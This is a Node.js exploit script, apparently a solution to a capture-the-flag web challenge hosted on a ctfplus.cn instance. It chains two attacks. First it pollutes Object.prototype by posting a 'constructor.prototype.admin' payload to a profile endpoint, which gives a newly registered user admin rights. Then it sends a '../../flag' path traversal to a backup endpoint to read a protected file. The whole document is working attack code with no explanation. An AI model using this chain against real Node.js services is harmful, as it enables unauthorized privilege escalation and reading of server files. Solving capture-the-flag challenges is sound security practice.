
const http = require('http');

const existingUid = "ae31d708980a4e888efe43e6cd3d6de0";

const querystring = require('querystring');
const loginPost = querystring.stringify({ uid: existingUid });

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginPost)
  }
};

console.log("Login existing user...");
const loginReq = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("Poisoning Object.prototype.admin = true...");
  
  const poisonData = JSON.stringify({
    "uid": existingUid,
    "constructor": {
      "prototype": {
        "admin": true
      }
    }
  });
  
  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };
  
  const poisonReq = http.request(poisonOpts, (poisonRes) => {
    let body = '';
    poisonRes.on('data', chunk => body += chunk);
    poisonRes.on('end', () => {
      console.log("Poison done, register new user...");
      registerNewUser();
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

loginReq.on('error', err => console.error(err));
loginReq.write(loginPost);
loginReq.end();

function registerNewUser() {
  const querystring = require('querystring');
  const postData = querystring.stringify({
    "username": "admintrue"
  });
  
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/register',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(opts, (res) => {
    let regBody = '';
    res.on('data', chunk => regBody += chunk);
    res.on('end', () => {
      const match = regBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
      if (match) {
        const uid = match[1];
        console.log(`Registered UID: ${uid}, login...`);
        loginAndCheck(uid);
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function loginAndCheck(uid) {
  const querystring = require('querystring');
  const postData = querystring.stringify({ uid: uid });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(opts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    checkBackup(cookie);
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function checkBackup(cookie) {
  const querystring = require('querystring');
  const postData = querystring.stringify({ file: '../../flag' });
  const opts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData),
      'Cookie': cookie
    }
  };

  const req = http.request(opts, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\nRESULT:");
      console.log(body);
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}
